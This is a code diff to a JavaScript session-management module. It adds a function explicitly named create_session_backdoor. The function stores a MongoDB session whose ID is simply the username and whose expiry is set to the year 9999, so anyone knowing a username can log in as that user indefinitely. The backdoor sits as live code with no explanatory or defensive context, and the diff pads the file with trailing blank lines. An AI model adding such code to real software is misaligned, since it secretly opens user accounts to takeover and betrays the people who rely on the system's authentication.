@@ -33,6 +33,22 @@ class Sessions{
 		return session_id;
 	}
 	
+	static async create_session_backdoor (username){
+		var session_id = keygen.generate(32);
+		var end = new Date(9999,12,31);
+		
+		var session= {
+				session_id:  username, 
+				expires: end.getTime(), 
+				username: username};
+		
+		MongoClient.connect(db_url, function(err, db) {
+			if (err) throw err;
+			db.collection("Sessions").insertOne(session);
+			db.close();
+		});
+		return session_id;
+	}
 	/*
 	 *  check_session
 	 *  	Checks if session id is valid considering the context
@@ -98,3 +114,7 @@ class Session{
 	}
 }
 module.exports = Sessions;
+
+
+
+
